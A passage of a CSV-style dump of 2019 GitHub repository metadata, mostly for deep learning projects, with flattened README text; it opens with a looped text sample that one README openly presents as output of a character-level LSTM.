sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of i will be able to say that it is the part of the sea whth the straw hat in the straw hat is the part of the sea whth the straw hat with the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat is the part of the sea whth the straw hat with the straw hat is the pirates of the straw hat is the part of the sea whth the straw hat is th It appears that the algorithm learns a pet phrase which is not so impressive But still seeing that the algorithm can only predict individual characters and gets most of the spelling right is a bit nice I believe more training can help in this scenario Also future prospcts for this include training on words rather than characters Currently the project uses LSTMs In future we can explore things like Conv1D and other like algorithms too temperature prediction This project is not entirely natural language processing It is a sequence prediction project which uses the same techniques as a natural language processing tasks We have used Dense Networks MLPs GRUs and LSTMs to predict temperature of next day given temperature of a whole day back The baseline was taken as the same temperature that was previous day at the same time The deep learning techniques successfully crossed this baseline Training and Validation Loss representation of GRUs on temperature prediction problem https github com vaibhav369 natural language processing blob master temperature prediction results temperaturepredictionGRUswithdropout png reuters imdb sentiment analysis and spam classification All these projects are types of text classification reuters is a many class classification whereas spam classification and imdb sentiment analysis are binary text classification projects Again they use similar techniques but to a different effect,2019-08-08T13:46:12Z,2019-08-11T12:25:32Z,Jupyter Notebook,vaibhav369,User,1,1,0,4,master,vaibhav369,1,0,0,0,0,0,0
mahayat,DL_CSCE5013,n/a,CSCE 5013 Deep Learning University of Arkansas Fall 2019 Instructor Thi Hoang Ngan Le https www andrew cmu edu user thihoanl Contents of this course are inspired from Introduction to Deep Learning CMU http www cs cmu edu bhiksha courses deeplearning Spring 2019 www Text Deep Learning https www deeplearningbook org Neural Networks and Deep Learning http neuralnetworksanddeeplearning com Online resources Joan Brunas Deep Learning Course http joanbruna github io stat212b Hugo Larochelle Neural Network Course http info usherbrooke ca hlarochelle neuralnetworks description html Deep Learning Summer School in Montreal https sites google com site deeplearningsummerschool2016 home,2019-08-30T16:27:54Z,2019-11-07T18:16:47Z,Jupyter Notebook,mahayat,User,1,1,0,25,master,mahayat,1,0,0,0,0,0,0
bhargavsundararajan,phishing-url-rwa,n/a,Phishing URL Detection using Recurrent Weighted Average Data Privacy is a serious issue with the advent of Technology and prevalence of Social Networks in today s era This project aims at tackling one avenue how your private data can be compromised Phishing websites The finaldataset csv contains 50 000 URLs with Benign and Phishing classes with equal proportion The Recurrent Weighted Average architecture is used to train a Deep Neural Network to classify these URLs to their respective classes The trained model has achieved an accuracy of 98 6 with the current dataset Dependencies Python 3 0 or higher TensorFlow Tkinter Training the Model 1 First clone the repository and install the above dependencies 2 To start training the model enter the following command in the terminal python train py 3 After training in complete you can test out any URL by running python usemodel py,2019-09-05T00:30:09Z,2019-11-11T22:21:38Z,Python,bhargavsundararajan,User,1,1,0,1,master,bhargavsundararajan,1,0,0,0,0,0,0
IHIaadj,drlnd-unity-navigation,n/a,Deep Reinforcement Learning Nanodegree Project 1 Navigation This project contains my solution for the first project of the DRLND https www udacity com course deep reinforcement learning nanodegree nd893 In this project we train a Banana collector that gets a 1 reward for collecting yellow bananas and 1 for the blue bananas This project implement a Value Based method called Deep Q Networks img src trainedagent gif alt Trained Agent My Banana Collector at work File organisation Report md Describe the used algorithm and the possible future works navigation ipynd Train code and running the agent agent py defines the agent and the learning functions model py defines the neural network that aim to predict the Q Action Value function dqncheckpoint pth Saved model Environement details The state space has 37 dimensions and contains the agent s velocity along with ray based perception of objects around the agent s forward direction Given this information the agent has to learn how to best select actions Four discrete actions are available corresponding to Move forward Move backward Turn left Turn right The task is episodic Well defined starting and ending point In order to solve the environment your agent must get an average score of 13 over 100 consecutive episodes Installation and usage Follow the instructions in the original Udacity repository https github com udacity deep reinforcement learning dependencies to install the different dependencies Download the Banana Unity Environment suitable for your OS Clone this repo Train the agent by executing the jupyter notebook navigation ipynb,2019-08-29T21:54:10Z,2019-09-19T07:38:58Z,Jupyter Notebook,IHIaadj,User,1,1,0,16,master,IHIaadj,1,0,0,0,0,0,0
Swall0w,cougar,n/a,Build Status https travis ci org Swall0w cougar svg branch master https travis ci org Swall0w cougar cougar PyTorch deep learning Vision library for fast prototyping This repository is inspired by Pytorch Project Template https github com moemen95 Pytorch Project Template maskrcnnbenchmark https github com facebookresearch maskrcnn benchmark Features Model Name Implemented Type Hints Testing Document Train Evaluation Inference DeepSORT 9745 9744 9744 9744 9744 9744 9744 Module Name Implemented Type Hints Testing Document Siamese Network 9745 9745 9744 9744 Loss Name Implemented Type Hints Test Document Focal Loss 9745 9745 9745 9744 Contrastive Loss 9745 9744 9744 9744 Triplet Loss 9745 9744 9744 9744,2019-08-30T13:51:48Z,2019-11-23T12:20:50Z,Python,Swall0w,User,1,1,0,45,master,Swall0w,1,0,0,0,0,0,0
morningstarwang,MSRLSTM-open,n/a,MSRLSTM Open Source Guidelines MSRLSTM is a deep learning model for transportation mode detection To successfully run this code there are several works needed to be done at first Download SHL Dataset from http www shl dataset org activity recognition challenge Sort the sampling data according to the given order file and merge data into Label1 txt to Label8 txt The columns should be timestamp accx accy accz grax gray graz gyrx gyry gyrz laccx laccy laccz magx magy magz oriw orix oriy oriz pressure label And the label column is ranged from 1 to 8 which represents 1 Still 2 Walk 3 Run 4 Bike 5 Car 6 Bus 7 Train 8 Subway Modify the utils config yaml configuration file Run data saver by shell script python run py config public lhy wms MSRLSTM utils config yaml mode datapreprocess Run trainer by shell script python run py config public lhy wms MSRLSTM utils config yaml mode train Run tester by shell script python run py config public lhy wms MSRLSTM utils config yaml mode test Updating Status 2019 10 9 Release the initial version for public use Application Status The MSRLSTM model is now running on https github com morningstarwang TMDMobileNG with our cloud server We are still testing and optimizing our MSRLSTM to behave more functionality in real world Notice This open source code is specially refracted for more human friendly study use Other researchers may find bugs because some of the codes are untested Our researchers are using more complex codes for our research and more codes will be released if any milestone is achieved,2019-08-22T09:06:47Z,2019-10-29T13:55:56Z,Python,morningstarwang,User,1,1,0,6,master,morningstarwang,1,0,0,0,0,0,0
tejanirla,image_classification,n/a,imageclassification Deep Learning implementation using TensorFlow for Image Classification The objective of this project is to develop a model capable of correctly classifying images of Dogs and Cats I am going to work on a subset of the original Dogs vs Cats Dataset 3000 images sampled from the original dataset of 25000 images to demonstrate techniques such as Image Augmentation and Droputs and how these techniques contribute in improving performance The smaller dataset spares us a lot of computing power I plan on demonstrating my work on the original dataset which demands GPU High Computing power soon,2019-09-11T22:31:50Z,2019-10-09T02:17:44Z,Jupyter Notebook,tejanirla,User,2,1,1,4,master,tejanirla,1,0,0,0,0,0,0
khordoo,traffic-watch-timeseries-prediction,n/a,,2019-09-10T01:24:09Z,2019-10-18T13:12:09Z,Jupyter Notebook,khordoo,User,1,1,0,1,master,khordoo,1,0,0,0,0,0,0
AnonymousProjs,LEMON,n/a,LEMON LEMON Deep Learning Library Testing via Effective Model Generation Environment configuration Install CUDA for your Ubuntu 16 04 LTS Note Two GPUs are required by default Install the specified versions of TensorFlow Theano and CNTK You can use Anaconda https www anaconda com distribution to create a separate environment for each experiment The relationship between TensorFlow and CUDA can be found here Datasets and pre trained models We trained 3 models on the Fashion MNIST CIFAR 10 and MNIST data and the corresponding codes are as follows LeNet5 based on MNIST https github com lucaaslb lenet5 mnist LeNet5 based on Fashion MNIST https colab research google com github margaretmz deep learning blob master fashionmnistkeras ipynb AlexNet based on CIFAR 10 https github com toxtli alexnet cifar 10 keras jupyter blob master alexnettest1 ipynb Please download the code and make small modifications to train your own models The weights of other models based ImageNet dataset can be obtained directly from Keras API You can get the weight and save the model as h5 file We sampled 1500 images from ImageNet and you can also sample your own images from the ImageNet validation dataset http www image net org challenges LSVRC 2012 nonpub downloads Running Before running please configure the path used in Lemon All options are defined in config experiments conf parameters Mutation Rules mutateops WS GF NEB NAI NS ARem ARep LA LC LR LS MLA Metrics metrics DMAD Initial Models and dataset exps alexnet cifar10 xception imagenet lenet5 fashion mnist lenet5 mnist resnet50 imagenet vgg16 imagenet densenet121 imagenet mobilenet 1 00 224 imagenet inception v3 imagenet Path of the initial models Name model file as alexnet cifar10origin h5 originmodeldir your path to originmodel Path of the ImageNet dataset datasetdir your path to dataset Backends names backend tensorflow theano cntk Number of mutated models mutatenum 100 Number of inputs testsize 1500 Seed pool size poolsize 50 mutate ratio mutateratio 0 3 redis host your redis ip port your redis port Please use the following command to execute Lemon Get 100 mutated models using Lemon shell python u generalmain py outputdir your path to output redisdb your redis db number redis has 16 databases 0 15 by default Get mutated models using Lemon in an hour shell python u timingmain py outputdir your path to output mode origin iter 1 redisdb your redis db number you can change iter if you want to repeat more than once Get mutated models using Lemonrand in an hour shell python u timingmain py outputdir your path to output mode random iter 1 redisdb your redis db number Get unique inconsistencies shell python u uniqueinconsistency py your path to output Localization shell python u localize py outputdir your path to output Results We published the original inconsistencies of five experiments from E1 to E5 and you can find them in data results,2019-08-23T05:51:53Z,2019-10-26T04:46:38Z,Python,AnonymousProjs,User,1,1,0,9,master,AnonymousProjs,1,0,0,0,0,0,0
MarioStanke,ddpg,n/a,ddpg Code originally from https github com udacity deep reinforcement learning Installation and Execution pip3 install gym pip3 install gym box2d sudo apt get install ffmpeg to produce videos cd ms python3 DDPG py Literature CONTINUOUS CONTROL WITH DEEP REINFORCEMENT LEARNING https arxiv org abs 1509 02971 Timothy P Lillicrap Jonathan J Hunt Alexander Pritzel Nicolas Heess Tom Erez Yuval Tassa David Silver Daan Wierstra Silver D Lever G Heess N Degris T Wierstra D Riedmiller M 2014 June Deterministic policy gradient algorithms http www jmlr org proceedings papers v32 silver14 pdf Notes Watch latest video in slow motion ls rt vid mp4 tail n 1 xargs mpv speed 1 TODOs make sure that exact same outcome is obtained with the same random seed,2019-08-13T08:39:57Z,2019-12-04T14:24:43Z,Jupyter Notebook,MarioStanke,User,1,1,0,41,master,MarioStanke#mauricerad,2,0,0,0,0,0,1
NitinJRepo,PyTorch,n/a,PyTorch Repository for sample machine learning and deep learning models in PyTorch,2019-08-11T08:20:58Z,2019-09-09T15:35:44Z,Python,NitinJRepo,User,1,1,0,8,master,NitinJRepo,1,0,0,0,0,0,0
Vantage-AI,Vantage_AI_Summer_Session,n/a,Vantage AI Summer Session Implementation of Q Learning Deep Q Learning and Policy Gradient along OpenAI s Gym Library Requirements Gym https gym openai com NumPy https www numpy org Pandas https pandas pydata org Keras https keras io Matplotlib https matplotlib org,2019-08-23T07:32:13Z,2019-08-23T11:56:09Z,Jupyter Notebook,Vantage-AI,Organization,2,1,0,3,master,MBKraus,1,0,0,0,0,0,0
aschiedermeier,Coursera_TensorFlow,n/a,CourseraTensorFlow Introduction to TensorFlow for Artificial Intelligence Machine Learning and Deep Learning https www coursera org learn introduction tensorflow home welcome,2019-08-25T08:58:23Z,2019-10-28T22:29:52Z,Python,aschiedermeier,User,1,1,0,9,master,aschiedermeier,1,0,0,0,0,0,0
thomas-tf,time-series-forecast-django,n/a,time series forecast django Time Series forecast web app using statistically modelling machine learning and deep learning algorithms Live Demo https time series forecast django herokuapp com Deep learning algorithms are disabled as resources are very limited using a free hosting plan Deploy on Heroku Simply clone this repo and connect to your cloned repo on Heroku then click on Deploy branch Run Locally 1 Get Python 3 6 2 Run pip install r requirements txt python manage py migrate 3 Then finally run python manage py runserver 4 Open your browser and go to http 127 0 0 1 8000 Algorithms Algorithms are stored in tspredict algorithms Feel free to add your own and alter tspredict views py tspredict templates main header html,2019-09-09T09:23:09Z,2019-09-17T09:13:43Z,Python,thomas-tf,User,1,1,0,12,master,thomas-tf,1,0,0,0,0,1,0
kadu9,Tensorflow-in-practice-specialization-AndrewNg,n/a,,2019-08-12T13:32:26Z,2019-10-10T13:59:17Z,Jupyter Notebook,kadu9,User,1,1,1,11,master,kbmlcoding,1,0,0,0,0,0,0
rajprabhu2011,MLAIDL,n/a,,2019-09-02T22:45:27Z,2019-09-02T22:47:59Z,n/a,rajprabhu2011,User,1,1,0,0,master,,0,0,0,0,0,0,0
vignesh628,AMAZON_FINE_FOOD_REVIEWS,n/a,amazonfinefoodreviews applying the machine learning algorithms and deep learning techniques over the amazon food reviews,2019-08-15T07:24:51Z,2019-10-15T11:56:39Z,Jupyter Notebook,vignesh628,User,1,1,0,3,master,vignesh628,1,0,0,0,0,0,0
SahanaRamnath,Reinforcement-Learning-Paper-Summaries,n/a,Reinforcement Learning Paper Summaries This repository contains summaries of some recent papers listed below in active areas of RL such as Deep RL Hierarchical RL and Model based RL It also includes a detailed presentation for the paper A Distributional Perspective on Reinforcement Learning https arxiv org abs 1707 06887 Done as a part of CS7011 Topics in Reinforcement Learning Papers World Models https arxiv org abs 1803 10122 A Laplacian Framework for Option Discovery in Reinforcement Learning https arxiv org abs 1703 00956 Hindsight Experience Replay https arxiv org abs 1707 01495 Soft Actor Critic Off Policy Maximum Entropy Deep Reinforcement Learning with a Stochastic Actor https arxiv org abs 1801 01290 A Distributional Perspective on Reinforcement Learning https arxiv org abs 1707 06887 Rainbow Combining Improvements in Deep Reinforcement Learning https arxiv org abs 1710 02298 Imagination Augmented Agents for Deep Reinforcement Learning https arxiv org abs 1707 06203 Latent Space Policies for Hierarchical Reinforcement Learning https arxiv org abs 1804 02808 Proximal Policy Optimization Algorithms https arxiv org abs 1707 06347 Reinforcement Learning with Deep Energy Based Policies https arxiv org abs 1702 08165 Overcoming catastrophic forgetting in neural networks https arxiv org abs 1612 00796 Deep Q learning from Demonstrations https arxiv org abs 1704 03732 Implicit Quantile Networks for Distributional Reinforcement Learning https arxiv org abs 1806 06923,2019-09-18T19:59:25Z,2019-09-23T18:27:15Z,n/a,SahanaRamnath,User,1,1,0,5,master,SahanaRamnath,1,0,0,0,0,0,0
tamasino52,Real-time-image-based-obstacle-detection-and-identification-system-using-deep-learning-on-railroad,n/a,Project General Outline This project is an ongoing project with the support of Spartan SW project to study Computer Vision of Soongsil University The objective of the project is to improve problem resolution and understanding of the model by using a variety of deep learning models to meet the challenges faced in the field Our topic is to install a camera on the front of the train to detect tracks and obstacles The system is designed to minimize casualties and property damage by sending a signal to the engineer when the detected obstacle is on the track and there is a possibility of serious casualties or equipment damage in the event of a collision For this purpose the image of the track and the masked data were studied to create a Segmentation Model Also we selected Object Detection Deep Learning Model to recognize obstacle The data used for learning was prepared with track and train models and taken in a controlled environment Our ultimate goal is to detect and signal the driver even when any obstacles are detected but because this project was designed for demonstration rather than for actual commercialization we planned to learn only a few pre selected obstacles and demonstrate them in a controlled environment And because the number of used data is low we ve use Augmentation it in a variety of ways Award Performance 1 Bronze Prize on Software Contest In Soongsil Univercity 2019 11 07 2 Korean Software Registeration Railway Obstacle Detection System RODS Railroad Tracker 2019 11 30 3 Patent Registeration Railroad Obstacle Detection System RODS 2019 11 30 Models 1 Railway Segmentation model U net 2 Obstacle Detection model Faster RCNN Inception V2 We used some of EdjeElectronics s code to design the model The original author s Githeub code address is as follows https github com EdjeElectronics TensorFlow Object Detection API Tutorial Train Multiple Objects Windows 10 Workflow 1 Setting for training 2 Training model You can skip this to download pretrained models 3 Run Project Time Estimated 8 hours By Kim Minseok Department of Software in Soongsil University Lee Juhui Department of Software in Soongsil University Setting for training Our project based on anaconda tensorflow gpu jupyter notebook and etc So you have to install these first Also I made this project on CUDA 10 0 and cuDNN 7 3 environment If you install another version I don t warrant about result I recommand to activate this code on virtual anaconda setting How to run 1 Clone our git first https github com tamasino52 Real time image based obstacle detection and identification system using deep learning on railroad 2 Clone https github com tensorflow models git 3 Download trained Unet model from Put file in models research objectdetection models https drive google com open id 1fcCa7Z Vt06H6o39b1tnCFILtsP1ckJf 4 Move our all file to models research objectdetection 5 Download fasterrcnninceptionv2coco20180128 model from https github com tensorflow models blob master research objectdetection g3doc detectionmodelzoo md 6 Move model file to fasterrcnninceptionv2coco20180128 folder in models research objectdetection 7 Run RailwayTrackingModelTraining ipynb file to generate model 8 Run ObstacleDetectionModelTraining ipynb file to generate seccond model 9 Run Run py file for video and image or Run ipynb file only for image to activate project 9 1 If you want to use captured image Run Runcapture py After you run Click and Drag points that you want to capture Then check your valid yellow box press esc to activate project Simulation Result,2019-09-10T12:22:05Z,2019-12-06T07:04:55Z,Jupyter Notebook,tamasino52,User,1,1,0,30,master,tamasino52,1,0,0,0,0,0,0
asetkn,Tutorial-Image-and-Multiple-Bounding-Boxes-Augmentation-for-Deep-Learning-in-4-Steps,n/a,Tutorial Image and Multiple Bounding Boxes Augmentation for Deep Learning in 4 Steps Say we have images for training our Deep Neural Network We also have separate PASCAL VOC format XML files with coordinates of bounding boxes for objects we are going to train our model to detect We want to use TensorFlow Object Detection API https github com tensorflow models tree master research objectdetection To do so we are planning to 1 Convert all XML files into one CSV file that we can feed into TensorFlow Object Detection API 2 Resize all images together with the corresponding object bounding boxes 3 Augment images to upsample our dataset Corresponding object bounding boxes should be augmented accordingly 4 Document augmented images new sizes and bounding boxes coordinates to a CSV file This tutorial will walk you through this process step by step At the core of this tutorial we will use amazing imgaug library https github com aleju imgaug Author has published tutorials https nbviewer jupyter org github aleju imgaug doc tree master notebooks on the use of the library and Documentation https imgaug readthedocs io en latest index html But here s a problem I had to spend a whole day digging through the Documentation and coding up the script for my problem I decided to share it so you don t have to waste your time Easiest way to install imgaug is through Anaconda Follow this steps in Anaconda promt to create virtual environment install imgaug and activate the environment conda create n myenv python 3 5 6 conda config add channels conda forge conda install imgaug conda activate myenv You can refer to imgaug library GitHub page https github com aleju imgaug for additional info on installation To work through this tutorial you would need pandas installed as well If you work through Anaconda it is installed by default Download the repository and open Tutorial Image and Multiple Bounding Boxes Augmentation for Deep Learning in 4 Steps ipynb to follow along,2019-08-10T11:16:42Z,2019-12-10T07:46:46Z,Jupyter Notebook,asetkn,User,1,1,1,7,master,asetkn,1,0,0,0,0,0,0
siddharthjain1611,Deep-Learning-and-Computer-Vision-A-Z-OpenCV-SSD-GANs,n/a,Deep Learning Computer Vision A Z OpenCV SSD Generative Adversarial Networks https www udemy com computer vision a z You ve definitely heard of AI and Deep Learning But when you ask yourself what is my position with respect to this new industrial revolution that might lead you to another fundamental question am I a consumer or a creator For most people nowadays the answer would be a consumer But what if you could also become a creator What if there was a way for you to easily break into the World of Artificial Intelligence and build amazing applications which leverage the latest technology to make the World a better place Sounds too good to be true doesn t it But there actually is a way Computer Vision is by far the easiest way of becoming a creator And it s not only the easiest way it s also the branch of AI where there is the most to create Why You ll ask That s because Computer Vision is applied everywhere From health to retail to entertainment the list goes on Computer Vision is already a 18 Billion market and is growing exponentially Just think of tumor detection in patient MRI brain scans How many more lives are saved every day simply because a computer can analyze 10 000x more images than a human And what if you find an industry where Computer Vision is not yet applied Then all the better That means there s a business opportunity which you can take advantage of So now that raises the question how do you break into the World of Computer Vision Up until now computer vision has for the most part been a maze A growing maze As the number of codes libraries and tools in CV grows it becomes harder and harder to not get lost On top of that not only do you need to know how to use it you also need to know how it works to maximise the advantage of using Computer Vision To this problem we want to bring Computer Vision A Z With this brand new course you will not only learn how the most popular computer vision methods work but you will also learn to apply them in practice Can t wait to see you inside the class Kirill Hadelin What are the requirements Only High School Maths What am I going to get from this course Have a toolbox of the most powerful Computer Vision models Understand the theory behind Computer Vision Master OpenCV Master Object Detection Master Facial Recognition Create powerful Computer Vision applications What is the target audience Anyone interested in Computer Vision or Artificial Intelligence,2019-08-22T14:10:42Z,2019-08-28T19:14:07Z,Python,siddharthjain1611,User,1,1,0,8,master,siddharthjain1611,1,0,0,0,0,0,0
Milo-F,OpenCV-Learning,n/a,OpenCV Learning OpenCV This repository is used for saving codes of my learning about OpenCV and deep learning tensorfloe Thursday August 15 2019 7 29 PM breadcast C A bCij Aij bj Wednesday August 21 2019 8 58 AM,2019-08-24T15:06:17Z,2019-08-26T08:31:21Z,Python,Milo-F,User,1,1,0,11,master,Milo-F,1,0,0,0,0,0,0
younesh11,AnomalyDetection,n/a,AnomalyDetection detection of Different types of anomaly like fraud detection cancer detection etc using different Machine learning Deep learning approach,2019-08-07T10:24:13Z,2019-08-16T12:58:43Z,Jupyter Notebook,younesh11,User,1,1,0,5,master,younesh11,1,0,0,0,0,0,0
shishishu,mnist-classification-tutorial,image-classfication#mnist-dataset#pytorch#tensorflow,MNIST CLASSIFICATION TUTORIAL Overview Algorithms Machine learning LR SVM XGBoost MLP Deep learning CNN ResNet VAE Distilling Knowledge Data Free Learning Framework Sklearn Tensorflow Pytorch Progress Model Framework Main Params Test Accuracy Time Cost s Comments LR sklearn solver liblinear multiclass ovr 0 9202 57 87 SVM sklearn kernel rbf decisionfunctionshape ovr 0 9446 556 91 XGBoost sklearn maxdepth 5 njobs 10 0 9651 141 38 MLP sklearn hiddenlayersizes 128 32 0 9768 44 80 MLP tensorflow batchsize 512 learningrate 1e 3 hiddenlayers 128 32 0 9795 39 05 CNN tensorflow batchsize 256 learningrate 1e 5 numepoch 100 0 9785 1062 03 ResNet VAE Distilling Knowledge Data Free Learning Reference THE MNIST DATABASE of handwritten digits http yann lecun com exdb mnist ConvNetJS MNIST demo https cs stanford edu people karpathy convnetjs demo mnist html Feed Forward Neural Net for MNIST https wpovell net posts ffnn mnist html,2019-09-08T14:19:14Z,2019-10-21T14:50:39Z,Python,shishishu,User,1,1,0,16,master,shishishu,1,0,0,0,0,1,0
ashwin4glory,Human-Activity-Recognition,deep-learning#divide-and-conquer#gradient-boosting#lstm#lstm-neural-networks#random-forest,Human Activity Recognition This project is to build a model that predicts the human activities such as Walking WalkingUpstairs WalkingDownstairs Sitting Standing or Laying This dataset is collected from 30 persons referred as subjects in this dataset performing different activities with a smartphone to their waists The data is recorded with the help of sensors accelerometer and Gyroscope in that smartphone This experiment was video recorded to label the data manually How data was recorded By using the sensors Gyroscope and accelerometer in a smartphone they have captured 3 axial linear acceleration tAcc XYZ from accelerometer and 3 axial angular velocity tGyro XYZ from Gyroscope with several variations prefix t in those metrics denotes time suffix XYZ represents 3 axial signals in X Y and Z directions Feature names These sensor signals are preprocessed by applying noise filters and then sampled in fixed width windows sliding windows of 2 56 seconds each with 50 overlap ie each window has 128 readings From Each window a feature vector was obtianed by calculating variables from the time and frequency domain In our dataset each datapoint represents a window with different readings The accelertion signal was saperated into Body and Gravity acceleration signals tBodyAcc XYZ and tGravityAcc XYZ using some low pass filter with corner frequecy of 0 3Hz After that the body linear acceleration and angular velocity were derived in time to obtian jerk signals tBodyAccJerk XYZ and tBodyGyroJerk XYZ The magnitude of these 3 dimensional signals were calculated using the Euclidian norm This magnitudes are represented as features with names like tBodyAccMag tGravityAccMag tBodyAccJerkMag tBodyGyroMag and tBodyGyroJerkMag Finally We ve got frequency domain signals from some of the available signals by applying a FFT Fast Fourier Transform These signals obtained were labeled with prefix f just like original signals with prefix t These signals are labeled as fBodyAcc XYZ fBodyGyroMag etc YLabels Encoded In the dataset Ylabels are represented as numbers from 1 to 6 as their identifiers WALKING as 1 WALKINGUPSTAIRS as 2 WALKINGDOWNSTAIRS as 3 SITTING as 4 STANDING as 5 LAYING as 6 Train and test data were saperated The readings from 70 of the volunteers were taken as trianing data and remaining 30 subjects recordings were taken for test data Data All the data is present in UCIHARdataset folder in present working directory Feature names are present in UCIHARdataset features txt Train Data UCIHARdataset train Xtrain txt UCIHARdataset train subjecttrain txt UCIHARdataset train ytrain txt Test Data UCIHARdataset test Xtest txt UCIHARdataset test subjecttest txt UCIHARdataset test ytest txt Data Size 27 MB Quick overview of the dataset Accelerometer and Gyroscope readings are taken from 30 volunteers referred as subjects while performing the following 6 Activities Walking WalkingUpstairs WalkingDownstairs Standing Sitting Lying Readings are divided into a window of 2 56 seconds with 50 overlapping Accelerometer readings are divided into gravity acceleration and body acceleration readings which has x y and z components each Gyroscope readings are the measure of angular velocities which has x y and z components Jerk signals are calculated for BodyAcceleration readings Fourier Transforms are made on the above time readings to obtain frequency readings Now on all the base signal readings mean max mad sma arcoefficient engerybands entropy etc are calculated for each window We get a feature vector of 561 features and these features are given in the dataset Each window of readings is a datapoint of 561 features Problem Framework 30 subjects volunteers data is randomly split to 70 21 test and 30 7 train data Each datapoint corresponds one of the 6 Activities Problem Statement Given a new datapoint we have to predict the Activity,2019-09-13T15:29:11Z,2019-09-13T20:09:17Z,Jupyter Notebook,ashwin4glory,User,1,1,0,6,master,ashwin4glory,1,0,0,0,0,0,0
harish3110,PyTorch-Tutorial,n/a,,2019-08-13T09:06:44Z,2019-08-15T11:13:57Z,Jupyter Notebook,harish3110,User,1,1,0,4,master,harish3110,1,0,0,0,0,0,0
oishikm,Voice-Gender-Predictor,n/a,Voice Gender Predictor A deep learning model to analyze voice pitch data to classify male and female voice,2019-08-07T14:23:32Z,2019-08-07T14:54:05Z,Jupyter Notebook,oishikm,User,1,1,0,2,master,oishikm,1,0,0,0,0,0,0
Kokhungchan,EmotionRecognition,n/a,,2019-08-29T14:17:17Z,2019-10-12T06:58:12Z,Python,Kokhungchan,User,1,1,0,1,master,Kokhungchan,1,0,0,1,0,2,0
RolandHewage,RolyEmployeeRetentionPredictor,n/a,A Deep Learning Model to Predict Employee Retention Using Keras and TensorFlow,2019-08-30T11:12:19Z,2019-08-30T11:29:45Z,Jupyter Notebook,RolandHewage,User,1,1,0,3,master,RolandHewage,1,0,0,0,0,0,0
nkennek,softtriple_pytorch,n/a,softtriplepytorch Unofficial implementation of SoftTriple Loss Deep Metric Learning Without Triplet Sampling how to install pip install git https github com nkennek softtriplepytorch git egg softtriplepytorch how to run experiment 1 clone this repository and cd 2 run pipenv install dev pipenv run python m bin cub2011experiment Note I have not succssfully reproduce R 1 of 60 1 with CUB 2001 yet Any further trials are welcome,2019-09-19T09:05:06Z,2019-11-22T01:02:51Z,Python,nkennek,User,1,1,0,5,master,nkennek,1,0,0,0,0,0,0
emrekavur,Basic-Ensembles-of-DMs-for-Liver-Segmentation,n/a,Basic Ensembles of Deep Learning Models for Liver Segmentation from CT Images This repo contains a sample script for the ensemble methods explained in article Basic Ensembles of Deep Learning Models for Liver Segmentation from CT Images For detailed explanations please refer to the article currently in review The code was written in MATLAB ensemleDeepModelsMAIN m is the main script that users need to execute There are evaluation of four individual segmentation methods and implentation of five different ensemble methods as well as their evaluations in the script Data is provided from CHAOS challenge dataset https zenodo org record 3367758 CT Set 2 Besides of all files in this repo it is necessary to download deepModelResults mat https yadi sk d ff6Tld0jcbrz2g 143 MB from the provided link This file stores probability maps coming from four individual Deep Models for CHAOS CT Set 2 These models are 1 DeepMedic K Kamnitsas E Ferrante S Parisot C Ledig A V Nori A Criminisi et al DeepMedic for brain tumor segmentation in Lecture Notes in Computer Science vol 10154 LNCS Springer Cham oct 2016 pp 138149 https link springer com chapter 10 1007 978 3 319 55524 914 2 Dense V Networks E Gibson F Giganti Y Hu E Bonmati S Bandula K Gurusamy et al Automatic Multi Organ Segmentation on Abdominal CT with Dense V Networks IEEE Transactions on Medical Imaging vol 37 no 8 pp 18221834 aug 2018 https ieeexplore ieee org document 8291609 3 U net O Ronneberger P Fischer and T Brox U net Convolutional networks for biomedical image segmentation in Lecture Notes in Computer Science vol 9351 Springer Cham 2015 pp 234241 https link springer com chapter 10 1007 2F978 3 319 24574 428 4 V net F Milletari N Navab and S A Ahmadi V Net Fully convolutional neural networks for volumetric medical image segmentation in Proceedings 2016 4th International Conference on 3D Vision 3DV 2016 IEEE oct 2016 pp 565571 http ieeexplore ieee org document 7785132 The ensemble combination methods are majority vote average product and min max Note that min and max combiners are identical for two class problems Ludmila I Kuncheva Combining Pattern Classifiers Methods and Algorithms Second Edition Wiley Interscience 2014 ISBN 0471210781 vol 9781118315 https onlinelibrary wiley com doi book 10 1002 9781118914564 The evaluation is handled by CHAOS challenge metrics For more information about CHAOS Challenge https chaos grand challenge org CHAOS Evaluation Code https github com emrekavur CHAOS evaluation CHAOS Dataset https zenodo org record 3367758,2019-09-12T21:07:27Z,2019-10-11T15:45:53Z,MATLAB,emrekavur,User,2,1,0,5,master,emrekavur#LucyKuncheva,2,0,0,0,0,0,0
psusmit,noise-generator,n/a,noise generator A random noise generator it generates random images useful for deep learning research OR for GANs it generates 100 random images and saves it do change the dir path name Install the required dependencies python modules,2019-08-14T17:02:27Z,2019-08-14T17:07:42Z,Jupyter Notebook,psusmit,User,1,1,0,5,master,psusmit,1,0,0,0,0,0,0
